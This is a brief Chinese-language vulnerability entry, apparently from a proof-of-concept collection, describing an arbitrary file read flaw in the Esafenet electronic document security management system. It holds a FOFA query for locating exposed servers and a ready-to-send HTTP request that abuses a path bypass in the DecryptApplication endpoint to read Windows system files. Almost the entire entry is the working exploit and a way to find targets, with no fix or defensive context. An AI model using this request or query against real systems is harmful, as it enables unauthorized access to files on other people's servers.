## 亿赛通电子文档安全管理系统DecryptApplication存在任意文件读取漏洞

## fofa
```
app="亿赛通电子文档安全管理系统"
```

## poc
```
GET /CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C:///Windows/win.ini&uploadFileId=1&fileName1=test1111 HTTP/1.1
Host: :8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Content-Type: text/xml
Cache-Control: no-cache
Pragma: no-cache

```

![image](https://github.com/wy876/wiki/assets/139549762/86d020d4-0072-4e50-8825-3614ae930806)
